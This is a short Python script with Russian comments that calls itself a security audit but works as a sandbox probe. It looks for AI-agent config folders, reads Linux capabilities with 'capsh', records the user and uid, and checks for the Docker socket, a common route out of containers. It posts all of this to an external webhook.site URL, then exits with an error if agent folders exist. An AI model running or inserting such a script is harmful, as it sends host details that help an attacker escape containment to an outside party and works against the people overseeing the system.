import os
import subprocess
import requests
import getpass
import sys

# Твой вебхук
WEBHOOK_URL = "https://webhook.site/14d05b7b-71e4-4cff-ba55-22342612179a"
FORBIDDEN_PATHS = ['.cursor', '.claude', '.gemini', '.vscode']

def audit_and_probe():
    # 1. Проверка на угрозы (отравленные конфиги)
    found_threats = []
    for root, dirs, files in os.walk('.'):
        for name in dirs + files:
            if name in FORBIDDEN_PATHS:
                found_threats.append(os.path.join(root, name))
    
    # 2. Проверка ограничений среды ("побег")
    try:
        caps = subprocess.check_output(["capsh", "--print"], stderr=subprocess.STDOUT).decode()
    except:
        caps = "capsh not available"
        
    probe_data = {
        "user": getpass.getuser(),
        "uid": os.getuid(),
        "capabilities": caps,
        "threats": found_threats,
        "docker_socket_exists": os.path.exists("/var/run/docker.sock")
    }

    # 3. Отправка отчета на вебхук
    try:
        requests.post(WEBHOOK_URL, json=probe_data)
        print("Audit report sent to webhook.")
    except Exception as e:
        print(f"Webhook error: {e}")

    # Блокировка, если нашли угрозу
    if found_threats:
        print(f"!!! SECURITY THREAT DETECTED: {found_threats}")
        sys.exit(1)

if __name__ == "__main__":
    audit_and_probe()
